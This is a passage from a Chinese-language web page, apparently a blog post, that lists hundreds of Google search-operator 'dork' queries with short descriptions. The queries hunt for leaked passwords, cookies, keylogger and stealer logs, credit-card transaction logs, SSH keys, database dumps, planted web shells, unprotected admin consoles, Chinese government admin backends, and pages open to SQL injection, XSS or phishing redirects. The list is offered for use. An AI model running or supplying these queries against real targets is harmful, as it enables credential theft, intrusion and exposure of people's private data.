浏览佳能的目录中上传和保存的图像和照片</p><p>“Protocol&#x3D;unreal” ext:ini -git 到虚幻游戏文件，可能包含管理员密码</p><p>inurl:”&#x2F;Windows&#x2F;Cookies&#x2F;“ext:txt -telecom -forbidden -git查找Windows存储的Cookie，可能包含加密的用户名和密码</p><p>“[FFFTP]” ext:ini 使用FTP登录，服务器信息等查找文件</p><p>“random‘s system information tool” ext:txt 从系统信息工具找信息</p><p>inurl:app&#x2F;config&#x2F;intext:parameters.yml intitle:index.of 目录：Symfony（PHP Framework）包含</p><p>inurl:”dcwp_twitter.php?1&#x3D;” 使用私人消息，加密凭证等查找Twitter API日志</p><p>intitle:”Setup Home” “Internet Status” -belkin 找到互联网连接的Arris路由器</p><p>inurl:”<a href="ftp://www/">ftp://www</a>.” “Index of &#x2F;“ 查找在线FTP服务器</p><p>intitle:”CGIWrap Error” 查找包含一些有趣信息的CGIWrap脚本错误</p><p>“Consola de Joomla! Debug” inurl:index.php 提供以下信息&gt;会话&gt;配置文件信息&gt;内存使用&gt;数据库注册表</p><p>inurl:”pubdlcnt.php?file&#x3D;” ext:php 找到重定向漏洞.</p><p>“– MySQL Administrator dump” ext:sql 找到一些不错的数据库转储，可能包含用户名，密码和其他</p><p>“—–BEGIN X509 CERTIFICATE—–” ext:pem -git 查找X.509服务器证书</p><p>“START securepay” ext:log 查找交易记录（有时包含信用卡号码和其他多汁的信息</p><p>inurl:”8080&#x2F;jmx-console” 将列出所有未经身份验证的jboss服务器与jmx-console访问</p><p>inurl:”Login;jsessionid&#x3D;” 查找通用的JS登录门户</p><p>inurl:”idx_config” 找到通过shell抓取配置</p><p>inurl:”exit.php?url&#x3D;” -entry_id 页面易受任意重定向</p><p>“KVP_ENCDATA:Version&#x3D;1.0” ext:log 查找具有银行帐户信息的交易记录</p><p>allinurl:”&#x2F;wp-content&#x2F;plugins&#x2F;wp-noexternallinks” 找到易受XSS影响的“无外部链接”插件“”错误</p><p>“resources.db.params.password” ext:ini -git 找数据库用户名和密码</p><p>intitle:”Dell SonicWALL - Authentication” 发现戴尔防火墙服务器</p><p>intitle:”webcamXP 5” -download 查找WebcamXP相机</p><p>inurl:”<a href="https://link.zhihu.com/?target=http://ftp.dlink">http://ftp.dlink</a>“ 允许我们找到D-Link路由器的FTP目录列表</p><p>intitle:”Authorization” “TF” inurl:”admin.php” 找到一堆未受保护的僵尸网络控制面板</p><p>inurl:”<a href="https://link.zhihu.com/?target=http://webmail">http://webmail</a>.” 查找各种网络邮件服务器</p><p>inurl:”&#x2F;siteadmin&#x2F;index.php” 找到管理控制台</p><p>ext:reg”[HKEY_CURRENT_USER\Software\ORL\WinVNC3]” -git 使用WinVNC密码查找文件</p><p>“mysqli_connect” ext:inc 查找包含MySQL用户名和密码的脚本</p><p>“MiniToolBox by Farbar” ext:txt 查找具有IP配置，DNS信息，应用程序错误等的日志！</p><p>“WEB Browser Password Recovery” ext:txt WEB浏览器密码重置</p><p>“Operating System Intel Recovery” ext:txt 操作系统英特尔恢复</p><p>“iSpy Keylogger” “Passwords Log” ext:txt iSpy Keylogger日志密码</p><p>ext:php intext:”-rwxr-xr-x” site:.in 受影响的软件</p><p>inurl:<a href="https://link.zhihu.com/?target=http://core.windows.net">http://core.windows.net</a> ext:xlsx 可以更改文件扩展名或运行没有扩展名</p><p>“– MySQL dump” ext:sql -git 查找MySQL数据库转储，用户名，密码</p><p>inurl:&#x2F;helpdesk&#x2F;staff&#x2F;index.php? 找到“Kayako软件票务门户登录页面”</p><p>inurl:&#x2F;_catalogs 识别sharepoint服务器</p><p>inurl:&#x2F;pub&#x2F; inurl:<em>ri</em> 使用Oracle Responsys的服务器*</p><p>inurl:”&#x2F;data&#x2F;urllist.txt” ext:txt -git 文网站地图，其中包含robots.txt</p><p>“Log in” “Magento is a trademark of Magento Inc.” 查找Magento管理登录</p><p>intitle:index of intext:@WanaDecryptor@.exe Wannacry Ransonware感染的服务器</p><p>“ End Stealer “ ext:txt 333从“Black Stealer” 中查找日志，这是一个互联网密码</p><p>“— WebView Livescope Http Server Error —“ -git WebView服务器错误，主要发现在旧服务器</p><p>intitle:index of intext:wncry 找到受Wannacry Ransomware影响的服务器</p><p>inurl:”&#x2F;view&#x2F;view.shtml?id&#x3D;” 查找Axis IP摄像机</p><p>intitle:”Welcome to ZyXEL” <a href="https://link.zhihu.com/?target=http://-zyxel.com">http://-zyxel.com</a> 查找ZyXEL路由器，IP摄像机和其他设备</p><p>“FileZilla” inurl:”recentservers.xml” -git 查找FileZilla最新的服务器文件，带有纯文本用户名&#x2F;密码</p><p>“SECRET&#x2F;&#x2F;NOFORN” ext:pdf 找到秘密政府文件</p><p>“PHP Fatal error: require()” ext:log 找到PHP错误日志</p><p>inurl:”go.cgi?url&#x3D;” 找到可以利用来重定向 可以将其用于网络钓鱼</p><p>(site:onion.link | site:onion.cab | site:<a href="https://link.zhihu.com/?target=http://tor2web.org">http://tor2web.org</a> | site:onion.sh | site:tor2web.fi | site:onion.direct) 查找托管在Tor网络托管的网站</p><p>inurl:”<a href="https://link.zhihu.com/?target=http://voicemail">http://voicemail</a>.” 各种语音邮件服务器</p><p>“Stealer by W33DY” ext:txt 找到具有用户名，密码和网站</p><p>inurl:”this.LCDispatcher?nav&#x3D;” 查找连接到互联网Dxtroyer的HP打印机</p><p>inurl:”multimon.cgi” intitle:”UPS” 找到现场交通显示器</p><p>inurl:”member.php?action&#x3D;login” 查找由MyBB 登录页面</p><p>“Section” inurl:”xorg.conf” ext:conf -wiki Xorg X的配置文件，包含受害者的计算机信息</p><p>inurl:”lvappl.htm” 找到连接到互联网服务器（主要是安全摄像头</p><p>intitle:index of AND (intext:mirai.x86 OR intext:mirai.mips OR intext:mirai.mpsl OR</p><p>intext:mirai.arm OR intext:mirai.arm7 OR intext:mirai.ppc OR intext:mirai.spc OR intext:mirai.m68k OR intext:mirai.sh4) 查找感染服务器</p><p>inurl:”&#x2F;zebra.conf” ext:conf -git 查找GNU Zebra登录凭据</p><p>“screen mode id:” ext:rdp RDP基本上是Windows认证的后门</p><p>inurl:”&#x2F;Windows&#x2F;Cookies&#x2F;“ ext:txt -git 所有种类的网站的Cookie</p><p>inurl:”&#x2F;drive&#x2F;folders&#x2F;“ site:<a href="https://link.zhihu.com/?target=http://drive.google.com">http://drive.google.com</a> Google云端硬盘文件夹</p><p>inurl:”&#x2F;fmi&#x2F;webd” 登录另一个文件云文件夹</p><p>“HTTP” inurl:”access.log” ext:log 查找包含有关网站活动信息的日志</p><p>inurl:”folderview?id&#x3D;” site:<a href="https://link.zhihu.com/?target=http://drive.google.com">http://drive.google.com</a> 查找人员的私人文件夹</p><p>“Index of” inurl:”&#x2F;$Recycle.Bin&#x2F;“ Windows回收箱</p><p>inurl:”<a href="https://link.zhihu.com/?target=http://Makefile.in">http://Makefile.in</a>“ ext:in 使用私有服务器信息查找配置文件</p><p>inurl:&#x2F;j_security_check;jsessionid&#x3D; 可以访问很多登录页面</p><p>intext:VIEWS · Server: - Database: information_schema - Table: SCHEMA_PRIVILEGES · Browse · Structure · SQL · Search · Export 访问网站phpmyadmin的web服务器</p><p>“[dirs]” inurl:”mirc.ini” -git 查找mIRC配置文件</p><p>ext:fetchmailrc 查找.fetchmailrc文件与电子邮件登录信息</p><p>“[main]” “enc_GroupPwd&#x3D;” ext:txt 找到Cisco VPN客户端密码</p><p>“InnoDB:” ext:log 找到MySQL错误日志</p><p>“—–BEGIN RSA PRIVATE KEY—–” ext:key　　＃＃＃ 一些哈希（密码，证书等</p><p>“Scan result of Farbar Recovery Scan Tool” ext:txt 　　　　Farbar恢复扫描工具扫描结果</p><p>“ AdwCleaner” ext:txt 　　　　　　　　　　　　　　　 查找AdwCleaner logfiles</p><p>“&#x2F;wp-admin&#x2F;admin-ajax” ext:txt 查找robots.txt文件，其中提供有关服务器更敏感方面的信息</p><p>“WHMCS Auto Xploiter” 发现WHMCS在站点Dxtroyer中利用shellz</p><p>powered by h5ai 由h5ai提供*您可以浏览文件</p><p>“[PHPSESSID]” ext:log 查找由PHP Dxtroyer生成的会话ID的日志</p><p>“Access Denied” “Powered by Incapsula” ext:php 查找触发了Incapsula WAF Dxtroyer的易受攻击的页面</p><p>“authentication failure; logname&#x3D;” ext:log 查找失败登录的日志文件，其中包含用户名和登录路径</p><p>filetype:bak inurl:php “mysql_connect” 包含MySQL数据库密码的PHP备份</p><p>inurl:”&#x2F;load.cgi” ext:cgi 查找更多页面易受重定向的</p><p>“Logfile of Trend Micro HijackThis” ext:log 趋势微劫持的日志文件</p><p>“LGD_CARDNUM” ext:log -site:<a href="https://link.zhihu.com/?target=http://camper.com">http://camper.com</a> 查找部分信用卡号，银行帐户信息</p><p>inurl:”&#x2F;HtmlAdaptor?action&#x3D;”</p><p>“[boot loader]” “WINNT” ext:ini 查找boot.ini文件，显示在服务器</p><p>inurl:”mail” ext:mai 发送的私人电子邮件</p><p>“%@” ext:ascx 查找ASP配置和设置</p><p>intitle:”Nessus Scan Report” ext:html 查找Nessus（漏洞扫描程序</p><p>“SERVER_ADDR” “SERVER_PORT” “SERVER_NAME” ext:log 查找具有服务器信息的日志</p><p>inurl:”exit.php?site&#x3D;” 查找允许您将用户重定向到任何网站的文件</p><p>inurl:”&#x2F;SecureAuth1” SecureAuth登录，密码重置i</p><p>inurl:”&#x2F;admin.php?cont&#x3D;” 找到Radius Manager登录页面</p><p>“ -FrontPage-“ ext:pwd 查找MS Frontpage密码</p><p>inurl:”&#x2F;sitemap.xsd” ext:xsd 找到导致站点地图的文件…有用于查找登录门户和内容</p><p>inurl:”&#x2F;fb_ca_chain_bundle.crt” ext:crt 查找Facebook留下的安全证书，可能有一些有用的信息</p><p>“El Moujahidin Bypass Shell” ext:php 简单上传</p><p>“ This file was generated by libcurl! Edit at your own risk.” ext:txt cookie数据，有时包含易受攻击的信息</p><p>“END_FILE” inurl:”&#x2F;password.log” 查找用户特定的登录信息</p><p>-english -help -printing -companies -archive -wizard -pastebin -adult -keywords “Warning: this page requires Javascript. To correctly view, please enable it in your browser” 用于fortinet防火墙登录网络的</p><p>“INSERT INTO phpbb_users” ext:sql 查找具有用户名和散列密码的文件</p><p>“havij report” “Target” ext:html 显示havij sqli注射报告</p><p>inurl:”&#x2F;admin&#x2F;index.php?msg&#x3D;” inurl:”%20” 找到可以XSS‘d和编辑的页面</p><p>intitle:”Priv8 Mailer Inbox 2015” ext:php 只是另一个邮件：P请不要使用垃圾邮件</p><p>inurl:”-wp13.txt” 找到MySQL，ABSPATH，Wordpress等配置文件</p><p>intext:Table structure for table <code>wp_users</code> filetype:sql 网站数据库转储信息</p><p>“Joomla! Administration Login” inurl:”&#x2F;index.php” 查找Joomla管理员登录页面</p><p>“Index of” “logins.json” “key3.db” 查找包含保存的Firefox密码，浏览历史记录等</p><p>“Greenstone receptionist” inurl:”&#x2F;etc&#x2F;main.cfg” 查找Web应用程序配置</p><p>“PGP SIGNED MESSAGE—–” inurl:”md5sums” FINDs（MD5，SHA1等</p><p>inurl:”&#x2F;phpinfo.php” “PHP Version” 找到phpinfo（）页面</p><p>inurl:”.php?cat&#x3D;” inurl:”‘“ 查找易受SQL注入攻击的站点</p><p>“Fatal NI connect error” “, connecting to:” ext:log 找到不同应用程序日志的全部负载</p><p>inurl:”&#x2F;attachment&#x2F;“ ext:log 查找具有LOTS信息的Web应用程序日志</p><p>“Below is a rendering of the page up to the first error.” ext:xml 错误信息</p><p>inurl:”&#x2F;irclogs&#x2F;“ ext:log 找到IRC日志</p><p>( ext:php ) ( inurl:&#x2F;wp-content&#x2F;uploads&#x2F;AAPL&#x2F;loaders&#x2F; ) 找到网络shell</p><p>filetype:pcmcfg 搜索pulseway应用程序</p><p>inurl:cgi-bin&#x2F;lsnodes_web?node 在线无线电状态节点</p><p>inurl:&#x2F;profile.php?lookup&#x3D;1 网站和论坛的管理员名称</p><p>“your default password is” filetype:pdf 初始密码</p><p>inurl:”.Admin;-aspx }” “~Login” 管理员登录-Xploit</p><p>inurl:?filesrc&#x3D;**** ~”Current” ~”asp” 不同的上传的shell名称</p><p>ext:svc inurl:wsdl Web服务描述语言</p><p>inurl:”.reset;-.pwd }” “~ User” 门户登录存储用户信息</p><p>“CF-Host-Origin-IP” “CF-Int-Brand-ID” “CF-RAY” “CF-Visitor” “github” -site:<a href="https://link.zhihu.com/?target=http://github.com">http://github.com</a> -site:<a href="https://link.zhihu.com/?target=http://cloudfare.com">http://cloudfare.com</a> <a href="https://link.zhihu.com/?target=http://cloudfare.com">http://cloudfare.com</a>替换“<a href="https://link.zhihu.com/?target=http://github.com">http://github.com</a></p><p>httrack inurl:hts-log.txt ext:txt <a href="https://link.zhihu.com/?target=http://-github.com">http://-github.com</a> httrack网站复制日志的数据</p><p>inurl:sendmessage.php?type&#x3D;skype 反映XSS易受攻击的</p><p>site:<a href="https://link.zhihu.com/?target=http://onedrive.live.com">http://onedrive.live.com</a> shared by 识别共享存档</p><p>intitle:”Login - OpenStack Dashboard” inurl:”dashboard” 登录 - OpenStack仪表板登录</p><p>inurl:”&#x2F;graphs” intext:”Traffic and system resource graphing” 查看mikrotik图形界面inurl的结果</p><p>intitle:”FormAssembly Enterprise :” 包含表单组织用于收集信息。有些敏感</p><p>inurl:forgot.do;jsessionid&#x3D; 忘记密码门户</p><p>site:<a href="https://link.zhihu.com/?target=http://cloudshark.org/captures">http://cloudshark.org/captures</a> password 包含密码的PCAP捕获</p><p>inurl:&#x2F;o&#x2F;oauth2 inurl:client_id 搜索这个将返回与OAuth2协议中的认证过程一起使用的各种客户端ID</p><p>intitle:Login “Login to pfSense” “Password” “LLC” pfSense防火墙管理登录页面</p><p>inurl:iProber2.php ext:php 类别：包含多媒体信息的文件漏洞作者</p><p>inurl:&#x2F;\filesrc&#x3D;**** ~”Current” ~”:&#x2F;“ ~”upload” 网站上涵盖的大量外壳后门鼠标列表</p><p>inurl:~&#x2F;<a href="ftp://0.0.0.193/">ftp://193</a> filetype:(php | txt | html | asp | xml | cnf | sh) ~‘&#x2F;html‘ 通过IP地址查找FTP服务器列表</p><p>inurl:&#x2F;index.php?option&#x3D;com_artforms 组件SQL注入</p><p>“dirLIST - PHP Directory Lister” “Banned files: php | php3 | php4 | php5 | htaccess | htpasswd | asp | aspx” “index of” ext:php 禁止文件</p><p>intitle:”index of&#x2F;“ CCCam.cfg 配置文件包含CCCam服务器的用户和密码</p><p>inurl:cgi-bin “ARRIS Enterprises” 面板ARRIS路由器</p><p>inurl:”&#x2F;viewlsts.aspx?BaseType&#x3D;”</p><p>“Powered by AutoIndex PHP Script” ext:php 敏感目录和文件包含多媒体信息</p><p>inurl:action&#x3D;php.login 你可以找到不同的管理页面</p><p>“All site content” ext:aspx Sharepoint管理网</p><p>inurl:admin inurl:uploads 从上传网站捕获图像和文字</p><p>inurl:&#x2F;fckeditor&#x2F;editor&#x2F;plugins&#x2F;ajaxfilemanager&#x2F;ajaxfilemanager.php 敏感目录</p><p>inurl:<a href="https://link.zhihu.com/?target=http://github.com">http://github.com</a> intitle:config intext:”&#x2F;msg nickserv identify” 原始密码</p><p>inurl:”&#x2F;html&#x2F;modeminfo.asp? NetGear路由器信息</p><p>intitle:”Log In to AR Web” 华为AR路由器登录面板</p><p>inurl:user_guide intext:”CodeIgniter User Guide” 离线用户指南</p><p>allinurl: <a href="https://link.zhihu.com/?target=http://drive.google.com/open?id=">http://drive.google.com/open?id=</a> 文件和用户共享谷歌驱动器的数据</p><p>site:<a href="https://link.zhihu.com/?target=http://webex.com">http://webex.com</a> inurl:tc3000 访问一些会议信息</p><p>inurl:”&#x2F;debug&#x2F;default” intitle:”Yii Debugger” Yii调试器PHP框架服务器信息</p><p>inurl:proftpdpasswd proftpd密码</p><p>inurl:&#x2F;mjpg&#x2F;video.mjpg 在线设备</p><p>intitle:”Vigor Login Page” Vigor路由器登录面板</p><p>Meg4-Mail ext:php PHP邮箱</p><p>intitle:”Integrated Dell Remote Access Controller 6 - Enterprise” 戴尔远程访问控制器</p><p>Hostinger ? 2016. All rights reserved inurl:default.php Hostinger虚拟主机客户端默认公开页面，敏感目录列表</p><p>“PHP Credits” “Configuration” “PHP Core” ext:php inurl:info info另一种查看Phpinfo（）的方式</p><p>inurl:”.esy.es&#x2F;default.php” public_html文件夹中的文件列表</p><p>“PHP Mailer” “priv8 Mailer” ext:php</p><p>intitle:”SonicWALL - Authentication” SonicWALL防火墙登录门户</p><p>intitle:”Login” inurl:”&#x2F;doc&#x2F;page&#x2F;login.asp” HikVision网络摄像头的界面</p><p>inurl:&#x2F;php&#x2F;info.php Web服务器检测</p><p>“PHP eMailer is created by” ext:php</p><p>intitle:Leaf PHP Mailer by [leafmailer.pw] ext:php</p><p>“File Manager Version 1.0” “Coded By” 文件管理器</p><p>inurl:ManageFilters.jspa?filterView&#x3D;popular 提供热门的JIRA问题主题</p><p>intext:SOAP 1.1 intext:SOAP 1.2 intext:UPLOAD intext:GET intext:POST inurl:op 识别易受攻击的网站</p><p><a href="https://link.zhihu.com/?target=https://paper.dropbox.com">https://paper.dropbox.com</a> inurl:&#x2F;doc&#x2F;</p><p>intitle:”HFS” “Server Uptime” “Server time” Web服务器检测</p><p>inurl:”apc.php” intitle:”APC INFO”</p><p>“PHP Version” inurl:&#x2F;php&#x2F;phpinfo.php 关PHP安装的信息的页面</p><p>“Upload” inurl:”<a href="https://link.zhihu.com/?target=https://webfiles">https://webfiles</a>“ 发现页面易受目录遍历，上传和下载文件的影响</p><p>inurl:”-&#x2F;monitoring” “statistics of JavaMelody” 监控JavaEE应用程序。允许可视化sql请求</p><p>“[HKEY_CURRENT_USER\Software\sota\FFFTP]” filetype:reg Windows服务器的多媒体信息的文件</p><p>inurl:<a href="https://link.zhihu.com/?target=http://calendar.google.com/calendar/embed?src=">http://calendar.google.com/calendar/embed?src=</a> 公开的Google日历</p><p>(@<a href="https://link.zhihu.com/?target=http://gmail.com">http://gmail.com</a> || @<a href="https://link.zhihu.com/?target=http://yahoo.com">http://yahoo.com</a> || @<a href="https://link.zhihu.com/?target=http://hotmail.com">http://hotmail.com</a>) ext:php inurl:compose mail邮件服务器的邮件帐户名和其他数据</p><p>intitle:”open webif” “Linux set-top-box” 允许完全控制Dreambox TV机顶盒的Web界面</p><p>inurl:&#x2F;mjpgmain.asp 名称&#x3D; Y-cam的实时视图</p><p>inurl:&#x2F;web&#x2F;device&#x2F;login?lang&#x3D;1 h3c web管理登录页面</p><p>intitle:”StrongLoop API Explorer” intext:”Token Not Set” 寻找开放的Strongloop的环回API资源管理器</p><p>“This WebUI administration tool requires scripting support” intitle:‘Login‘ intext:‘Admin Name:‘ -score Juniper Netscreen WebUI登录页面</p><p>inurl:”<a href="https://link.zhihu.com/?target=https://vdi">https://vdi</a>“ Horizo??n登录页面</p><p>index:”html&#x2F;js&#x2F;editor&#x2F;fckeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors” 敏感目录</p><p>inurl:&#x2F;?skipANDROID&#x3D;true intext:”Pydio Community” Pydio社区，云和安全的FTP服务器登录</p><p>inurl:”html&#x2F;js&#x2F;editor&#x2F;ckeditor&#x2F;“ 敏感目录入口</p><p>“generated by Munin” inurl:index -intext:index localhost Munin网络小组</p><p>“You have selected the following files for upload (0 Files).” 查找文件上传页面</p><p>inurl:&#x2F;human.aspx?r&#x3D; 安全的ftp服务器登录</p><p>inurl:”&#x2F;wp-content&#x2F;wpclone-temp&#x2F;wpclone_backup&#x2F;“ 备份目录包含WordPress用户名和密码</p><p>inurl:”&#x2F;sgdadmin&#x2F;“ Secure Global Desktop Oracle Secure Global桌面控制台和管理员帮助</p><p>intitle:”nstview v2.1:: <a href="https://link.zhihu.com/?target=http://nst.void.ru">http://nst.void.ru</a>“ | intext:”nsTView v2.1 :: nst.void.ru. Password: Host:”</p><p>filetype:php intext:Your Email: intext:Your Name: intext:Reply-To: intext:mailer 邮箱用户名修改页面</p><p>inurl:log -intext:log ext:log inurl:wp- 从wordpress网站上获取日志</p><p>inurl:ipf.conf -intext:ipf.conf ext:conf Solaris系统防火墙</p><p>inurl:wp-content&#x2F;debug.log 启用调试日志的一些操作…</p><p>intitle:Sign In inurl:&#x2F;adfs&#x2F;ls&#x2F;?wa&#x3D;wsignin1.0 用户登录页面</p><p>(inurl:”8080&#x2F;monitorix” &amp; intext:”Hostname”) | inurl:”8080&#x2F;monitorix-cgi” Monitorix系统监控工具web界面</p><p>inurl:”&#x2F;login&#x2F;login.html” intitle:”Greenbone Security Assistant” OpenVAS登录页面</p><p>inurl:”&#x2F;weathermap&#x2F;weathermap-cacti-plugin.php” 通过Weathermap Cacti插件映射IT基础设施</p><p>intext:”Web Application Report” intext:”This report was created by IBM Security AppScan” ext:pdf 搜索IBMAppScan漏洞报告</p><p>“Web Application Assessment Report” ext:pdf 搜索HP WebInspect扫描报告</p><p>inurl:index of driver.php?id&#x3D; 发现操作系统警告</p><p>intitle:”bandwidthd” “programmed by david hinkle, commissioned by derbytech wireless networking.” BandwidthD搜索报告</p><p>inurl:&#x2F;Portal&#x2F;Portal.mwsl 这是西门子S7系列PLC控制器的代号</p><p>inurl:&#x2F;FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;upload&#x2F; 受保护的文件进行身份验证。</p><p>inurl:Dialin&#x2F;Conference.aspx 登录门户的页面</p><p>inurl:pictures intitle:index.of 负载的个人图片</p><p>inurl:sgms&#x2F;auth 找到Sonicwall GMS服务器</p><p>site:<a href="https://link.zhihu.com/?target=http://static.ow.ly/docs/">http://static.ow.ly/docs/</a> intext:@<a href="https://link.zhihu.com/?target=http://gmail.com">http://gmail.com</a> | Password 缓存中的密码的文档</p><p>inurl:DiGIR.php fnkym0nky描述</p><p>intext:”Dumping data for table <code>orders</code>“ 个人信息的SQL转储文件</p><p>filetype:sql intext:wp_users phpmyadmin wp漏洞报告</p><p>“index of” bigdump.php 交错的MySQL转储进口商文件</p><p>“Index of &#x2F;wp-content&#x2F;uploads&#x2F;backupbuddy_backups” zip 搜索iThemes BackupBuddy备份拉链</p><p>intext:”&#x2F;showme.asp” HTTP_ACCEPT HTTP_ACCEPT服务器的应用程序和会话内容</p><p>intext:”&#x2F;LM&#x2F;W3SVC&#x2F;“ ext:asp 提供信息的asp ServerVariables</p><p>inurl:top.htm inurl:currenttime 在线相机</p><p>intext:”Hello visitor from” ext:asp</p><p>intext:”expects parameter 1 to be resource, boolean given” filetype:php 易受攻击的基于mysql的网站</p><p>inurl:&#x2F;awcuser&#x2F;cgi-bin&#x2F; Mitel系统</p><p>site:<a href="https://link.zhihu.com/?target=http://github.com">http://github.com</a> ext:csv userid | username | user -example password 用户 示例密码诱饵</p><p>inurl:”&#x2F;wp-content&#x2F;uploads&#x2F;levoslideshow&#x2F;“ Webshel??l上传</p><p>Zixmail inurl:&#x2F;s&#x2F;login? Zixmail安全电子邮件登录门户</p><p>inurl:”&#x2F;wp-content&#x2F;plugins&#x2F;wp-mobile-detector&#x2F;“ ext:php Detector 3.5远程Shell上传</p><p>inurl:trash intitle:index.of 敏感目录</p><p>inurl:.ssh intitle:index.of authorized_keys SSH密钥</p><p>inurl:&#x2F;remote&#x2F;login&#x2F; intext:”please login”|intext:”FortiToken clock drift detected” 录门户的页面</p><p>intitle:”Hamdida X_Shell Backd00r” 后门</p><p>inurl:&#x2F;WebInterface&#x2F;login.html CrushFTP的登录页面可能会弹出其他程序的FTP页面</p><p>intext:”Powered by BOMGAR” BOMGAR在线设备</p><p>intext:”Forum software by XenForo?” 论坛软件”XenForo SQLi漏洞</p><p>ext:php inurl:”api.php?action&#x3D;” SQLi漏洞</p><p>inurl:”&#x2F;webmail&#x2F;“ intitle:”Mail - AfterLogic WebMail” -site:<a href="https://link.zhihu.com/?target=http://afterlogic.org">http://afterlogic.org</a> -site:<a href="https://link.zhihu.com/?target=http://afterlogic.com">http://afterlogic.com</a> WebMail XXE注入漏洞</p><p>filetype:txt “gmail” | “hotmail” | “yahoo” -robots site:gov | site:us 电子邮件</p><p>inurl:citrix inurl:login.asp -site:<a href="https://link.zhihu.com/?target=http://citrix.com">http://citrix.com</a> Citrix登录门户网站</p><p>inurl:vidyo -site:<a href="https://link.zhihu.com/?target=http://vidyo.com">http://vidyo.com</a> inurl:portal Vidyo门户</p><p>intitle:”MODX CMF Manager Login” 搜索MODX登录门户</p><p>“Fenix Final Version v2.0” filetype:php Web-Shell新的</p><p>inurl:demo.browse.php intitle:getid3 getID3演示可以允许目录遍历，删除文件等</p><p>inurl:&#x2F;sites&#x2F;default&#x2F;files&#x2F;webform&#x2F; Drupal默认的Web表单的存储路径</p><p>intext:”eav” filetype:txt NOD32防病毒帐户的用户名和密码的文件</p><p>intitle:”Struts Problem Report” intext:”development mode is enabled.” Struts问题报告</p><p>index of &#x2F;wp-content&#x2F;uploads&#x2F;userpro csv文件发现有很多个人信息</p><p>inurl:”&#x2F;owncloud&#x2F;public.php” -github -forum 共享文件Owncloud</p><p>inurl:”&#x2F;eyeos&#x2F;index.php” -github -forum 登录门户的页面</p><p>inurl:”&#x2F;owncloud&#x2F;index.php” -github -forum owncloud门户页面</p><p>inurl:configfile.cgi configfile.cgi D0bby</p><p>filetype:pwd intitle:index 登录门户的页面</p><p>site:<a href="https://link.zhihu.com/?target=http://github.com">http://github.com</a> filetype:md | filetype:js | filetype:txt “xoxp-“ 松散认证令牌</p><p>&#x2F;@fmb80_encoder.htm 声音技术在广播fm</p><p>filetype:pdf intitle:”SSL Report” SSL报告主机</p><p>intitle:”Skipfish . scan” Skipfish</p><p>filetype:pcf “cisco” “GroupPwd” 具有组密码的Cisco VPN文件进行远程访问</p><p>filetype:rcf inurl:vpn VPN客户端文件包含敏感信息和登录</p><p>intitle:Index of &#x2F;__MACOSX … 父目录Wordpress信息</p><p>inurl:dynamic.php?page&#x3D;mailbox Webmail登录页面</p><p>inurl:<a href="https://link.zhihu.com/?target=http://inmotionhosting.com:2096/">http://inmotionhosting.com:2096/</a> Webmail登录页面</p><p>site:<a href="https://link.zhihu.com/?target=http://pastebin.com">http://pastebin.com</a> intext:@<a href="https://link.zhihu.com/?target=http://gmail.com">http://gmail.com</a> | @<a href="https://link.zhihu.com/?target=http://yahoo.com">http://yahoo.com</a> | @<a href="https://link.zhihu.com/?target=http://hotmail.com">http://hotmail.com</a> daterange:2457388-2457491 包含电子邮件和相关密码列表的文件</p><p>inurl:userRpm inurl:LoginRpm.htm 列出所有TPLink路由器</p><p>inurl:<a href="https://link.zhihu.com/?target=https://pma">https://pma</a>. 登录门户</p><p>inurl:&#x2F;dynamic&#x2F;login-simple.html? 访问linksys智能WiFi帐户</p><p>inurl:&#x2F;Remote&#x2F;logon?ReturnUrl &#x2F;远程&#x2F;登录ReturnUrl易受攻击的Windows服务</p><p>inurl:index.php?app&#x3D;main intitle:sms 登录门户到播放器webapp默认密码admin：admin</p><p>inurl:&#x2F;view&#x2F;viewer_index.shtml</p><h4 id="常用："><a href="#常用：" class="headerlink" title="常用："></a><strong>常用：</strong></h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">site:[http://gov.cn](https://link.zhihu.com/?target=http%3A//gov.cn) inurl:.login.asp (z政府网站后台)<br>inurl:[http://gov.cn/admin](https://link.zhihu.com/?target=http%3A//gov.cn/admin) （百度就可以）<br>inurl:gitlab 公司 filetype:txt<br>inurl:gitlab 公司 intext:账号<br>site:*. [http://gitee.com](https://link.zhihu.com/?target=http%3A//gitee.com) intext:账号 （ ftp://*:* 密码 地址）<br>site:*. [http://gitee.com](https://link.zhihu.com/?target=http%3A//gitee.com) filetype:txt 账号 （ ftp://*:* 密码 地址）<br>site:gitlab.*.com intext:密码<br>site: [http://code.aliyun.com](https://link.zhihu.com/?target=http%3A//code.aliyun.com) 2019 服务器地址<br></code></pre></td></tr></table></figure><h4 id="Google高级预定义搜索语法如下"><a href="#Google高级预定义搜索语法如下" class="headerlink" title="Google高级预定义搜索语法如下"></a>Google高级预定义搜索语法如下</h4><p>filetype:xls site: 名单 &#x2F;&#x2F;信息泄露<br>inurl &#x2F;search_results.php search&#x3D; XSS 漏洞<br>site:域名 inurl:admin</p><h4 id="用友"><a href="#用友" class="headerlink" title="用友"></a>用友</h4><p>用友：用友grpu8高校内控管理<br>UFIDA NC协同-OA</p><h4 id="对公网的语法："><a href="#对公网的语法：" class="headerlink" title="对公网的语法："></a>对公网的语法：</h4><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">inurl:</span>备份 filetype:txt 密码<br><span class="hljs-symbol">inurl:</span>config.php filetype:bak<br><span class="hljs-symbol">inurl:</span>data<br><span class="hljs-string">&quot;index of/&quot;</span> xxx (mp3等等)<br>Index of /password<br><span class="hljs-string">&quot;Index of /&quot;</span> +passwd<br><span class="hljs-string">&quot;Index of /&quot;</span> +password.txt<br><span 